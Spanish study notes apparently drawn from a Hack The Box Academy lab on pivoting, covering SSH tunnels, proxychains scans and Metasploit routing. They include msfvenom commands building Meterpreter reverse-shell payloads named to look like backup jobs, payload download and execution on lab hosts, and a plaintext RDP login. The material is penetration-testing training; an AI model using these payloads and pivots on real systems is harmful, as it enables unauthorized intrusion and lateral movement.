---
tags:
  - Pivoting
---
[[Pivoting_Tunneling_And_Port_Forwarding_Module_Cheat_Sheet.pdf]]
[[2️⃣​ - Pivoting, Tunneling and Port Forwarding]]


# ----- NUESTROS TUNELES -----
# SSH PORT FORWARDING/SOCKS TUNNELING
 
**NOTA IMPORTANTE:**
En windows los pings no les va a dar respuesta ya que el firewall y/o el defender lo bloqueará.

## SSH Reenvío de Puerto Local

Tomemos un ejemplo de la imagen de abajo.

![Diagrama de reenvío de puertos SSH: Attack Host (10.10.15.5) solicita reenvío desde el puerto local 1234 al puerto remoto 3306 en Victim Server (172.16.5.129, 10.129.15.50). SSH escucha en el puerto local 1234, reenvía tráfico a MySQL en localhost:3306 y regresa a través del puerto 22.](https://academy.hackthebox.com/storage/modules/158/11.png)

## Escaneando el Objetivo Pivot

  Reenvío Dinámico de Puertos con Túnel SSH y SOCKS

```shell-session
vcrdcr@htb[/htb]$ nmap -sT -p22,3306 10.129.202.64

Starting Nmap 7.92 ( https://nmap.org ) at 2022-02-24 12:12 EST
Nmap scan report for 10.129.202.64
Host is up (0.12s latency).

PORT     STATE  SERVICE
22/tcp   open   ssh
3306/tcp closed mysql

Nmap done: 1 IP address (1 host up) scanned in 0.68 seconds
```


#### Ejecución del Puerto Local Adelante

  Reenvío Dinámico de Puertos con Túnel SSH y SOCKS

```shell-session
vcrdcr@htb[/htb]$ ssh -L 1234:localhost:3306 ubuntu@10.129.202.64

ubuntu@10.129.202.64's password: 
Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.0-91-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Thu 24 Feb 2022 05:23:20 PM UTC

  System load:             0.0
  Usage of /:              28.4% of 13.72GB
  Memory usage:            34%
  Swap usage:              0%
  Processes:               175
  Users logged in:         1
  IPv4 address for ens192: 10.129.202.64
  IPv6 address for ens192: dead:beef::250:56ff:feb9:52eb
  IPv4 address for ens224: 172.16.5.129

 * Super-optimized for small spaces - read how we shrank the memory
   footprint of MicroK8s to make it the smallest full K8s around.

   https://ubuntu.com/blog/microk8s-memory-optimisation

66 updates can be applied immediately.
45 of these updates are standard security updates.
To see these additional updates run: apt list --upgradable
```


## Reenvío de Puertos Múltiples

  Reenvío Dinámico de Puertos con Túnel SSH y SOCKS

```shell-session
vcrdcr@htb[/htb]$ ssh -L 1234:localhost:3306 -L 8080:localhost:80 ubuntu@10.129.202.64
```


## Configuración de Pivot

Ahora, si escribes `ifconfig` en el host de Ubuntu, encontrará que este servidor tiene múltiples NIC:

- Uno conectado a nuestro anfitrión de ataque (`ens192`)
- Una comunicación con otros hosts dentro de una red diferente (`ens224`)
- La interfaz de bucle invertido (`lo`).

#### Buscando Oportunidades para Pivot usando ifconfig

  Reenvío Dinámico de Puertos con Túnel SSH y SOCKS

```shell-session
ubuntu@WEB01:~$ ifconfig 

ens192: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 10.129.202.64  netmask 255.255.0.0  broadcast 10.129.255.255
        inet6 dead:beef::250:56ff:feb9:52eb  prefixlen 64  scopeid 0x0<global>
        inet6 fe80::250:56ff:feb9:52eb  prefixlen 64  scopeid 0x20<link>
        ether 00:50:56:b9:52:eb  txqueuelen 1000  (Ethernet)
        RX packets 35571  bytes 177919049 (177.9 MB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 10452  bytes 1474767 (1.4 MB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

ens224: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 172.16.5.129  netmask 255.255.254.0  broadcast 172.16.5.255
        inet6 fe80::250:56ff:feb9:a9aa  prefixlen 64  scopeid 0x20<link>
        ether 00:50:56:b9:a9:aa  txqueuelen 1000  (Ethernet)
        RX packets 8251  bytes 1125190 (1.1 MB)
        RX errors 0  dropped 40  overruns 0  frame 0
        TX packets 1538  bytes 123584 (123.5 KB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10<host>
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 270  bytes 22432 (22.4 KB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 270  bytes 22432 (22.4 KB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
```


![Diagrama de configuración de escaneo Nmap: Attack Host (10.10.15.5) utiliza Proxychains y SSH Client para reenviar paquetes. SOCKS Listener en el puerto 9050 reenvía paquetes Nmap a través de SSH a Victim Server (10.129.15.50, 172.16.5.129) en el puerto 22 para escanear.](https://academy.hackthebox.com/storage/modules/158/22.png)

#### Habilitación del Reenvío Dinámico de Puertos con SSH

  Reenvío Dinámico de Puertos con Túnel SSH y SOCKS

```shell-session
vcrdcr@htb[/htb]$ ssh -D 9050 ubuntu@10.129.202.64
```


El `-D` el argumento solicita al servidor SSH que habilite el reenvío dinámico de puertos.


#### Comprobación /etc/proxychains.conf

  Reenvío Dinámico de Puertos con Túnel SSH y SOCKS

```shell-session
vcrdcr@htb[/htb]$ tail -4 /etc/proxychains.conf

# meanwile
# defaults set to "tor"
socks4 	127.0.0.1 9050
```


#### Usando Nmap con Proxychains

  Reenvío Dinámico de Puertos con Túnel SSH y SOCKS

```shell-session
vcrdcr@htb[/htb]$ proxychains nmap -v -sn 172.16.5.1-200

ProxyChains-3.1 (http://proxychains.sf.net)

Starting Nmap 7.92 ( https://nmap.org ) at 2022-02-24 12:30 EST
Initiating Ping Scan at 12:30
Scanning 10 hosts [2 ports/host]
|S-chain|-<>-127.0.0.1:9050-<><>-172.16.5.2:80-<--timeout
|S-chain|-<>-127.0.0.1:9050-<><>-172.16.5.5:80-<><>-OK
|S-chain|-<>-127.0.0.1:9050-<><>-172.16.5.6:80-<--timeout
RTTVAR has grown to over 2.3 seconds, decreasing to 2.0

<SNIP>
```


#### Enumerar el objetivo de Windows a través de Proxychains

  Reenvío Dinámico de Puertos con Túnel SSH y SOCKS

```shell-session
vcrdcr@htb[/htb]$ proxychains nmap -v -Pn -sT 172.16.5.19

ProxyChains-3.1 (http://proxychains.sf.net)
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.92 ( https://nmap.org ) at 2022-02-24 12:33 EST
Initiating Parallel DNS resolution of 1 host. at 12:33
Completed Parallel DNS resolution of 1 host. at 12:33, 0.15s elapsed
Initiating Connect Scan at 12:33
Scanning 172.16.5.19 [1000 ports]
|S-chain|-<>-127.0.0.1:9050-<><>-172.16.5.19:1720-<--timeout
|S-chain|-<>-127.0.0.1:9050-<><>-172.16.5.19-<--timeout
|S-chain|-<>-127.0.0.1:9050-<><>-172.16.5.19:587-<--timeout
|S-chain|-<>-127.0.0.1:9050-<><>-172.16.5.19:445-<><>-OK
Discovered open port 445/tcp on 172.16.5.19
|S-chain|-<>-127.0.0.1:9050-<><>-172.16.5.19:8080-<--timeout
|S-chain|-<>-127.0.0.1:9050-<><>-172.16.5.19:23-<--timeout
|S-chain|-<>-127.0.0.1:9050-<><>-172.16.5.19:135-<><>-OK
Discovered open port 135/tcp on 172.16.5.19
|S-chain|-<>-127.0.0.1:9050-<><>-172.16.5.19:110-<--timeout
|S-chain|-<>-127.0.0.1:9050-<><>-172.16.5.19:21-<--timeout
|S-chain|-<>-127.0.0.1:9050-<><>-172.16.5.19:554-<--timeout
|S-chain|-<>-127.0.0.1:9050-<><>-1172.16.5.19:25-<--timeout
|S-chain|-<>-127.0.0.1:9050-<><>-172.16.5.19:5900-<--timeout
|S-chain|-<>-127.0.0.1:9050-<><>-172.16.5.19:1025-<--timeout
|S-chain|-<>-127.0.0.1:9050-<><>-172.16.5.19:143-<--timeout
|S-chain|-<>-127.0.0.1:9050-<><>-172.16.5.19:199-<--timeout
|S-chain|-<>-127.0.0.1:9050-<><>-172.16.5.19:993-<--timeout
|S-chain|-<>-127.0.0.1:9050-<><>-172.16.5.19:995-<--timeout
|S-chain|-<>-127.0.0.1:9050-<><>-172.16.5.19:3389-<><>-OK
Discovered open port 3389/tcp on 172.16.5.19
|S-chain|-<>-127.0.0.1:9050-<><>-172.16.5.19:443-<--timeout
|S-chain|-<>-127.0.0.1:9050-<><>-172.16.5.19:80-<--timeout
|S-chain|-<>-127.0.0.1:9050-<><>-172.16.5.19:113-<--timeout
|S-chain|-<>-127.0.0.1:9050-<><>-172.16.5.19:8888-<--timeout
|S-chain|-<>-127.0.0.1:9050-<><>-172.16.5.19:139-<><>-OK
Discovered open port 139/tcp on 172.16.5.19
```

## Usando Metasploit con Proxychains

También podemos abrir Metasploit usando proxychains y enviar todo el tráfico asociado a través del proxy que hemos establecido.

  Reenvío Dinámico de Puertos con Túnel SSH y SOCKS

```shell-session
vcrdcr@htb[/htb]$ proxychains msfconsole

ProxyChains-3.1 (http://proxychains.sf.net)
                                                  

     .~+P``````-o+:.                                      -o+:.
.+oooyysyyssyyssyddh++os-`````                        ```````````````          `
+++++++++++++++++++++++sydhyoyso/:.````...`...-///::+ohhyosyyosyy/+om++:ooo///o
++++///////~~~~///////++++++++++++++++ooyysoyysosso+++++++++++++++++++///oossosy
--.`                 .-.-...-////+++++++++++++++////////~~//////++++++++++++///
                                `...............`              `...-/////...`


                                  .::::::::::-.                     .::::::-
                                .hmMMMMMMMMMMNddds\...//M\\.../hddddmMMMMMMNo
                                 :Nm-/NMMMMMMMMMMMMM$$NMMMMm&&MMMMMMMMMMMMMMy
                                 .sm/`-yMMMMMMMMMMMM$$MMMMMN&&MMMMMMMMMMMMMh`
                                  -Nd`  :MMMMMMMMMMM$$MMMMMN&&MMMMMMMMMMMMh`
                                   -Nh` .yMMMMMMMMMM$$MMMMMN&&MMMMMMMMMMMm/
    `oo/``-hd:  ``                 .sNd  :MMMMMMMMMM$$MMMMMN&&MMMMMMMMMMm/
      .yNmMMh//+syysso-``````       -mh` :MMMMMMMMMM$$MMMMMN&&MMMMMMMMMMd
    .shMMMMN//dmNMMMMMMMMMMMMs`     `:```-o++++oooo+:/ooooo+:+o+++oooo++/
    `///omh//dMMMMMMMMMMMMMMMN/:::::/+ooso--/ydh//+s+/ossssso:--syN///os:
          /MMMMMMMMMMMMMMMMMMd.     `/++-.-yy/...osydh/-+oo:-`o//...oyodh+
          -hMMmssddd+:dMMmNMMh.     `.-=mmk.//^^^\\.^^`:++:^^o://^^^\\`::
          .sMMmo.    -dMd--:mN/`           ||--X--||          ||--X--||
........../yddy/:...+hmo-...hdd:............\\=v=//............\\=v=//.........
================================================================================
=====================+--------------------------------+=========================
=====================| Session one died of dysentery. |=========================
=====================+--------------------------------+=========================
================================================================================

                     Press ENTER to size up the situation

%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
%%%%%%%%%%%%%%%%%%%%%%%%%%%%% Date: April 25, 1848 %%%%%%%%%%%%%%%%%%%%%%%%%%%%%
%%%%%%%%%%%%%%%%%%%%%%%%%% Weather: It's always cool in the lab %%%%%%%%%%%%%%%%
%%%%%%%%%%%%%%%%%%%%%%%%%%% Health: Overweight %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
%%%%%%%%%%%%%%%%%%%%%%%%% Caffeine: 12975 mg %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
%%%%%%%%%%%%%%%%%%%%%%%%%%% Hacked: All the things %%%%%%%%%%%%%%%%%%%%%%%%%%%%%
%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%

                        Press SPACE BAR to continue



       =[ metasploit v6.1.27-dev                          ]
+ -- --=[ 2196 exploits - 1162 auxiliary - 400 post       ]
+ -- --=[ 596 payloads - 45 encoders - 10 nops            ]
+ -- --=[ 9 evasion                                       ]

Metasploit tip: Adapter names can be used for IP params 
set LHOST eth0

msf6 > 
```


# SSH PORT FORWARDING remote/reverse


Es posible que también queramos reenviar un servicio local al puerto remoto. Consideremos el escenario donde podemos RDP en el host de Windows `Windows A`. Como se puede ver en la imagen a continuación, en nuestro caso anterior, podríamos pivotar en el host de Windows a través del servidor Ubuntu.

  
![Diagram showing network setup: Attack Host (10.10.15.5) connects via SSH to Victim Server (Ubuntu) at 10.129.15.50, 172.16.5.129. No route to Attack Host from Victim Server (Windows A) at 172.16.5.19 with RDP Service.](https://academy.hackthebox.com/storage/modules/158/33.png)


Hay varias veces durante un compromiso de prueba de penetración cuando no es factible tener solo una conexión de escritorio remoto. Quizás quieras `upload`/`download` archivos (cuando el portapapeles RDP está deshabilitado), `use exploits` o `low-level Windows API` usar una sesión de Meterpreter para realizar la enumeración en el host de Windows, lo cual no es posible utilizando el incorporado [Ejecutables de windows](https://lolbas-project.github.io/).

En estos casos, tendríamos que encontrar un host pivote, que es un punto de conexión común entre nuestro host de ataque y el servidor de Windows. En nuestro caso, nuestro host pivote sería el servidor Ubuntu ya que puede conectarse a ambos: `our attack host` y `the Windows target`. Para ganar un `Meterpreter shell` en Windows, crearemos una carga útil Meterpreter HTTPS utilizando `msfvenom`, pero la configuración de la conexión inversa para la carga útil sería la dirección IP del host del servidor Ubuntu (`172.16.5.129`). Utilizaremos el puerto 8080 en el servidor Ubuntu para reenviar todos nuestros paquetes inversos al puerto 8000 de nuestros hosts de ataque, donde se está ejecutando nuestro oyente Metasploit.

#### Creación de una carga útil de Windows con msfvenom

  Remote/Reverse Port Forwarding con SSH

```shell-session
vcrdcr@htb[/htb]$ msfvenom -p windows/x64/meterpreter/reverse_https lhost= <InternalIPofPivotHost> -f exe -o backupscript.exe LPORT=8080

[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 712 bytes
Final size of exe file: 7168 bytes
Saved as: backupscript.exe
```


#### Configuración e inicio del manipulador múltiple/manipulador

  Remote/Reverse Port Forwarding con SSH

```shell-session
msf6 > use exploit/multi/handler

[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_https
payload => windows/x64/meterpreter/reverse_https
msf6 exploit(multi/handler) > set lhost 0.0.0.0
lhost => 0.0.0.0
msf6 exploit(multi/handler) > set lport 8000
lport => 8000
msf6 exploit(multi/handler) > run

[*] Started HTTPS reverse handler on https://0.0.0.0:8000
```


Una vez que se crea nuestra carga útil y tenemos nuestro oyente configurado y en ejecución, podemos copiar la carga útil al servidor de Ubuntu utilizando el `scp` comando ya que ya tenemos las credenciales para conectarnos al servidor Ubuntu usando SSH.

#### Transferencia de carga útil a Pivot Host

  Remote/Reverse Port Forwarding con SSH

```shell-session
vcrdcr@htb[/htb]$ scp backupscript.exe ubuntu@<ipAddressofTarget>:~/

backupscript.exe                        
```

Después de copiar la carga útil, comenzaremos un `python3 HTTP server` usando el siguiente comando en el servidor Ubuntu en el mismo directorio donde copiamos nuestra carga útil.

#### Iniciar Python3 Webserver en Pivot Host

  Remote/Reverse Port Forwarding con SSH

```shell-session
ubuntu@Webserver$ python3 -m http.server 8123
```


#### Descarga de carga útil en el Objetivo de Windows

Podemos descargar esto `backupscript.exe` en el host de Windows a través de un navegador web o el cmdlet PowerShell `Invoke-WebRequest`.

  Remote/Reverse Port Forwarding con SSH

```powershell-session
PS C:\Windows\system32> Invoke-WebRequest -Uri "http://172.16.5.129:8123/backupscript.exe" -OutFile "C:\backupscript.exe"
```

Una vez que tengamos nuestra carga útil descargada en el host de Windows, la usaremos `SSH remote port forwarding` para reenviar conexiones desde el puerto 8080 del servidor Ubuntu al servicio de escucha de nuestra msfconsole en el puerto 8000. Usaremos `-vN` argumento en nuestro comando SSH para hacerlo detallado y pedirle que no solicite el shell de inicio de sesión. El `-R` el comando le pide al servidor de Ubuntu que escuche `<targetIPaddress>:8080` y reenvíe todas las conexiones entrantes en el puerto `8080` a nuestro oyente msfconsole en `0.0.0.0:8000` de nuestro `attack host`.


#### Usando SSH -R

  Remote/Reverse Port Forwarding con SSH

```shell-session
vcrdcr@htb[/htb]$ ssh -R <InternalIPofPivotHost>:8080:0.0.0.0:8000 ubuntu@<ipAddressofTarget> -vN
```


Después de crear el puerto remoto SSH hacia adelante, podemos ejecutar la carga útil desde el destino de Windows. Si la carga útil se ejecuta según lo previsto e intenta conectarse de nuevo a nuestro oyente, podemos ver los registros desde el pivote en el host de pivote.

#### Ver los registros desde el Pivote

  Remote/Reverse Port Forwarding con SSH

```shell-session
ebug1: client_request_forwarded_tcpip: listen 172.16.5.129 port 8080, originator 172.16.5.19 port 61355
debug1: connect_next: host 0.0.0.0 ([0.0.0.0]:8000) in progress, fd=5
debug1: channel 1: new [172.16.5.19]
debug1: confirm forwarded-tcpip
debug1: channel 0: free: 172.16.5.19, nchannels 2
debug1: channel 1: connected to 0.0.0.0 port 8000
debug1: channel 1: free: 172.16.5.19, nchannels 1
debug1: client_input_channel_open: ctype forwarded-tcpip rchan 2 win 2097152 max 32768
debug1: client_request_forwarded_tcpip: listen 172.16.5.129 port 8080, originator 172.16.5.19 port 61356
debug1: connect_next: host 0.0.0.0 ([0.0.0.0]:8000) in progress, fd=4
debug1: channel 0: new [172.16.5.19]
debug1: confirm forwarded-tcpip
debug1: channel 0: connected to 0.0.0.0 port 8000
```


Si todo está configurado correctamente, recibiremos un shell Meterpreter pivotado a través del servidor Ubuntu.

#### Sesión Meterpreter Establecida

  Remote/Reverse Port Forwarding con SSH

```shell-session
[*] Started HTTPS reverse handler on https://0.0.0.0:8000
[!] https://0.0.0.0:8000 handling request from 127.0.0.1; (UUID: x2hakcz9) Without a database connected that payload UUID tracking will not work!
[*] https://0.0.0.0:8000 handling request from 127.0.0.1; (UUID: x2hakcz9) Staging x64 payload (201308 bytes) ...
[!] https://0.0.0.0:8000 handling request from 127.0.0.1; (UUID: x2hakcz9) Without a database connected that payload UUID tracking will not work!
[*] Meterpreter session 1 opened (127.0.0.1:8000 -> 127.0.0.1 ) at 2022-03-02 10:48:10 -0500

meterpreter > shell
Process 3236 created.
Channel 1 created.
Microsoft Windows [Version 10.0.17763.1637]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\>
```

Nuestra sesión Meterpreter debe enumerar que nuestra conexión entrante es de un host local (`127.0.0.1`) ya que estamos recibiendo la conexión sobre el `local SSH socket`, que creó un `outbound` conexión al servidor Ubuntu. Emitir el `netstat` el comando puede mostrarnos que la conexión entrante es del servicio SSH.

La siguiente representación gráfica proporciona una forma alternativa de entender esta técnica.

![Diagrama que muestra la configuración de la red: Attack Host (10.10.15.5) reenvía el puerto remoto 8080 al puerto local 8000 a través de SSH. Victim Server (Ubuntu) escucha en el puerto 8080, reenvía a SSH. Servidor de víctimas (Windows A) en 172.16.5.19 con Servicio RDP. Carcasa inversa reenviada a MSFConsole en el puerto 8000.](https://academy.hackthebox.com/storage/modules/158/44.png)


# Meterpreter Tunneling & Port Forwarding (OPCIONES DE BARRIDO DE PINGS Y MÁS) (MSF)

VAMOS A TENER UNA SHELL METERPRETER EN NUESTRA MAQUINA VICTIMA PERO QUE ES DE LA MAQUINA PIVOTE LA CUAL VAMOS A TENER ACCESO A LA MÁQUINA WIN

ESTO HACE QUE NOS APROVECHEMOS DE LAS OPCIONES QUE TIENE UNA SHELL METERPRETER

#### Creación de carga útil para Ubuntu Pivot Host

  Meterpreter Túnel y Reenvío de Puertos

```shell-session
vcrdcr@htb[/htb]$ msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.10.14.18 -f elf -o backupjob LPORT=8080

[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 130 bytes
Final size of elf file: 250 bytes
Saved as: backupjob
```

Antes de copiar la carga útil, podemos iniciar un [multi/manipulador](https://www.rapid7.com/db/modules/exploit/multi/handler/), también conocido como un Manejador de Carga Útil Genérico.

#### Configuración e inicio del manipulador múltiple/manipulador

  Meterpreter Túnel y Reenvío de Puertos

```shell-session
msf6 > use exploit/multi/handler

[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set lhost 0.0.0.0
lhost => 0.0.0.0
msf6 exploit(multi/handler) > set lport 8080
lport => 8080
msf6 exploit(multi/handler) > set payload linux/x64/meterpreter/reverse_tcp
payload => linux/x64/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > run
[*] Started reverse TCP handler on 0.0.0.0:8080 
```


Podemos copiar el `backupjob` archivo binario al host pivote de Ubuntu `over SSH` y ejecutarlo para obtener una sesión de Meterpreter.

#### Ejecución de la carga útil en el Host Pivot

  Meterpreter Túnel y Reenvío de Puertos

```shell-session
ubuntu@WebServer:~$ ls

backupjob
ubuntu@WebServer:~$ chmod +x backupjob 
ubuntu@WebServer:~$ ./backupjob
```


Necesitamos asegurarnos de que la sesión Meterpreter se establezca con éxito al ejecutar la carga útil.

#### Establecimiento de la Sesión Meterpreter

  Meterpreter Túnel y Reenvío de Puertos

```shell-session
[*] Sending stage (3020772 bytes) to 10.129.202.64
[*] Meterpreter session 1 opened (10.10.14.18:8080 -> 10.129.202.64:39826 ) at 2022-03-03 12:27:43 -0500
meterpreter > pwd

/home/ubuntu
```


Sabemos que el objetivo de Windows está en la red 172.16.5.0/23. Así que suponiendo que el firewall en el objetivo de Windows está permitiendo solicitudes ICMP, nos gustaría realizar un barrido de ping en esta red. Podemos hacer eso usando Meterpreter con el `ping_sweep` módulo, que generará el tráfico ICMP desde el host de Ubuntu a la red `172.16.5.0/23`.

--- 

#### Barrido de Ping

  Meterpreter Túnel y Reenvío de Puertos

```shell-session
meterpreter > run post/multi/gather/ping_sweep RHOSTS=172.16.5.0/23

[*] Performing ping sweep for IP range 172.16.5.0/23
```


También podríamos realizar un barrido de ping usando un `for loop` directamente en un host pivote de destino que hará ping a cualquier dispositivo en el rango de red que especifiquemos. Aquí hay dos útiles barridos de ping para una línea de bucle que podríamos usar para hosts pivotantes basados en Linux y basados en Windows.

#### Ping Sweep For Loop en Linux Hosts Pivot

  Meterpreter Túnel y Reenvío de Puertos

```shell-session
for i in {1..254} ;do (ping -c 1 172.16.5.$i | grep "bytes from" &) ;done
```


#### Barrido de Ping Para Bucle Usando CMD

  Meterpreter Túnel y Reenvío de Puertos

```cmd-session
for /L %i in (1 1 254) do ping 172.16.5.%i -n 1 -w 100 | find "Reply"
```


#### Ping Sweep Usando PowerShell

  Meterpreter Túnel y Reenvío de Puertos

```powershell-session
1..254 | % {"172.16.5.$($_): $(Test-Connection -count 1 -comp 172.15.5.$($_) -quiet)"}
```


Podría haber escenarios en los que el firewall de un host bloquee el ping (ICMP), y el ping no nos dará respuestas exitosas. En estos casos, podemos realizar un escaneo TCP en la red 172.16.5.0/23 con Nmap. En lugar de usar SSH para el reenvío de puertos, también podemos usar el módulo de enrutamiento posterior a la explotación de Metasploit `socks_proxy` para configurar un proxy local en nuestro host de ataque. Configuraremos el proxy SOCKS para `SOCKS version 4a`. Esta configuración SOCKS iniciará un oyente en el puerto `9050` y enrute todo el tráfico recibido a través de nuestra sesión Meterpreter.

#### Configuración del proxy SOCKS de MSF

  Meterpreter Túnel y Reenvío de Puertos

```shell-session
msf6 > use auxiliary/server/socks_proxy

msf6 auxiliary(server/socks_proxy) > set SRVPORT 9050
SRVPORT => 9050
msf6 auxiliary(server/socks_proxy) > set SRVHOST 0.0.0.0
SRVHOST => 0.0.0.0
msf6 auxiliary(server/socks_proxy) > set version 4a
version => 4a
msf6 auxiliary(server/socks_proxy) > run
[*] Auxiliary module running as background job 0.

[*] Starting the SOCKS proxy server
msf6 auxiliary(server/socks_proxy) > options

Module options (auxiliary/server/socks_proxy):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SRVHOST  0.0.0.0          yes       The address to listen on
   SRVPORT  9050             yes       The port to listen on
   VERSION  4a               yes       The SOCKS version to use (Accepted: 4a,
                                        5)


Auxiliary action:

   Name   Description
   ----   -----------
   Proxy  Run a SOCKS proxy server
```


#### Confirmar que Proxy Server se está ejecutando

  Meterpreter Túnel y Reenvío de Puertos

```shell-session
msf6 auxiliary(server/socks_proxy) > jobs

Jobs
====

  Id  Name                           Payload  Payload opts
  --  ----                           -------  ------------
  0   Auxiliary: server/socks_proxy
```


Después de iniciar el servidor SOCKS, configuraremos proxychains para enrutar el tráfico generado por otras herramientas como Nmap a través de nuestro pivote en el host de Ubuntu comprometido. Podemos añadir la línea de abajo al final de nuestro `proxychains.conf` archivo ubicado en `/etc/proxychains.conf` si aún no está ahí.

#### Agregar una línea a proxychains.conf si es necesario

  Meterpreter Túnel y Reenvío de Puertos

```shell-session
socks4 	127.0.0.1 9050
```


Finalmente, debemos decirle a nuestro módulo socks_proxy que enrute todo el tráfico a través de nuestra sesión Meterpreter. Podemos usar el `post/multi/manage/autoroute` módulo de Metasploit para agregar rutas para la subred 172.16.5.0 y luego enrutar todo nuestro tráfico de proxychains.

#### Creación de rutas con AutoRoute

  Meterpreter Túnel y Reenvío de Puertos

```shell-session
msf6 > use post/multi/manage/autoroute

msf6 post(multi/manage/autoroute) > set SESSION 1
SESSION => 1
msf6 post(multi/manage/autoroute) > set SUBNET 172.16.5.0
SUBNET => 172.16.5.0
msf6 post(multi/manage/autoroute) > run

[!] SESSION may not be compatible with this module:
[!]  * incompatible session platform: linux
[*] Running module against 10.129.202.64
[*] Searching for subnets to autoroute.
[+] Route added to subnet 10.129.0.0/255.255.0.0 from host's routing table.
[+] Route added to subnet 172.16.5.0/255.255.254.0 from host's routing table.
[*] Post module execution completed
```

También es posible agregar rutas con autoroute ejecutando autoroute desde la sesión Meterpreter.

  Meterpreter Túnel y Reenvío de Puertos

```shell-session
meterpreter > run autoroute -s 172.16.5.0/23

[!] Meterpreter scripts are deprecated. Try post/multi/manage/autoroute.
[!] Example: run post/multi/manage/autoroute OPTION=value [...]
[*] Adding a route to 172.16.5.0/255.255.254.0...
[+] Added route to 172.16.5.0/255.255.254.0 via 10.129.202.64
[*] Use the -p option to list all active routes
```


Después de agregar la ruta(s) necesaria, podemos usar el `-p` opción para enumerar las rutas activas para asegurarse de que nuestra configuración se aplica como se espera.

#### Listado de Rutas Activas con AutoRoute

  Meterpreter Túnel y Reenvío de Puertos

```shell-session
meterpreter > run autoroute -p

[!] Meterpreter scripts are deprecated. Try post/multi/manage/autoroute.
[!] Example: run post/multi/manage/autoroute OPTION=value [...]

Active Routing Table
====================

   Subnet             Netmask            Gateway
   ------             -------            -------
   10.129.0.0         255.255.0.0        Session 1
   172.16.4.0         255.255.254.0      Session 1
   172.16.5.0         255.255.254.0      Session 1
```


Como puede ver en la salida anterior, la ruta se ha agregado a la red 172.16.5.0/23. Ahora podremos usar proxychains para enrutar nuestro tráfico Nmap a través de nuestra sesión Meterpreter.

#### Proxy de Prueba y Funcionalidad de Enrutamiento

  Meterpreter Túnel y Reenvío de Puertos

```shell-session
vcrdcr@htb[/htb]$ proxychains nmap 172.16.5.19 -p3389 -sT -v -Pn

ProxyChains-3.1 (http://proxychains.sf.net)
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.92 ( https://nmap.org ) at 2022-03-03 13:40 EST
Initiating Parallel DNS resolution of 1 host. at 13:40
Completed Parallel DNS resolution of 1 host. at 13:40, 0.12s elapsed
Initiating Connect Scan at 13:40
Scanning 172.16.5.19 [1 port]
|S-chain|-<>-127.0.0.1:9050-<><>-172.16.5.19 :3389-<><>-OK
Discovered open port 3389/tcp on 172.16.5.19
Completed Connect Scan at 13:40, 0.12s elapsed (1 total ports)
Nmap scan report for 172.16.5.19 
Host is up (0.12s latency).

PORT     STATE SERVICE
3389/tcp open  ms-wbt-server

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 0.45 seconds
```


## Reenvío de Puerto

El reenvío de puertos también se puede lograr usando Meterpreter's `portfwd` módulo. Podemos habilitar un oyente en nuestro host de ataque y solicitar a Meterpreter que reenvíe todos los paquetes recibidos en este puerto a través de nuestra sesión Meterpreter a un host remoto en la red 172.16.5.0/23.

#### Opciones de portfwd

  Meterpreter Túnel y Reenvío de Puertos

```shell-session
meterpreter > help portfwd

Usage: portfwd [-h] [add | delete | list | flush] [args]


OPTIONS:

    -h        Help banner.
    -i <opt>  Index of the port forward entry to interact with (see the "list" command).
    -l <opt>  Forward: local port to listen on. Reverse: local port to connect to.
    -L <opt>  Forward: local host to listen on (optional). Reverse: local host to connect to.
    -p <opt>  Forward: remote port to connect to. Reverse: remote port to listen on.
    -r <opt>  Forward: remote host to connect to.
    -R        Indicates a reverse port forward.
```


#### Creación de un Relé TCP Local

  Meterpreter Túnel y Reenvío de Puertos

```shell-session
meterpreter > portfwd add -l 3300 -p 3389 -r 172.16.5.19

[*] Local TCP relay created: :3300 <-> 172.16.5.19:3389
```

El comando anterior solicita a la sesión Meterpreter que inicie un oyente en el puerto local de nuestro host de ataque (`-l`) `3300` y reenviar todos los paquetes al control remoto (`-r`) Servidor de Windows `172.16.5.19` en `3389` puerto (`-p`) a través de nuestra sesión Meterpreter. Ahora, si ejecutamos xfreerdp en nuestro localhost:3300, podremos crear una sesión de escritorio remoto.


#### Conexión a Windows Target a través de localhost

  Meterpreter Túnel y Reenvío de Puertos

```shell-session
vcrdcr@htb[/htb]$ xfreerdp /v:localhost:3300 /u:victor /p:pass@123
```


#### Salida Netstat

